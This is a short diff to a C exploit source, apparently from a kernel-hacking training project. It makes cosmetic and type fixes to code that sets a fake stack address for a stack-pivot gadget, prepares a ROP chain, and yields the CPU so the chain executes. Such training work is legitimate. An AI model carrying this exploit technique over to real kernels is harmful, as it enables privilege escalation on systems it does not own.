@@ -44,7 +44,7 @@
 #include <sys/user.h>
 #include "drill.h"
 
-#define FAKE_STACK_ADDR			0xf6000000 /* STACKPIVOT_GADGET_PTR changes rsp to this value */
+#define FAKE_STACK_ADDR			0xf6000000UL /* STACKPIVOT_GADGET_PTR changes rsp to this value */
 #define FAKE_STACK_MMAP_ADDR		(FAKE_STACK_ADDR - PAGE_SIZE)
 #define MMAP_SZ				(PAGE_SIZE * 2)
 #define PAYLOAD_SZ			95
@@ -210,9 +210,8 @@ int main(void)
 	/*
 	 * Prepare
 	 */
-
-	if (prepare_rop_chain() == EXIT_FAILURE){
-		perror("[-] ROP preparing");
+	if (prepare_rop_chain() == EXIT_FAILURE) {
+		printf("[-] ROP preparing failed\n");
 		goto end;
 	}
 
@@ -269,7 +268,7 @@ int main(void)
 	 * This function frees up the current CPU for other tasks, causing the ROP chain to
 	 * execute from the new scheduler time slice.
 	 */
-	if (sched_yield() < 0){
+	if (sched_yield() < 0) {
 		perror("[-] sched_yield");
 		goto end;
 	}
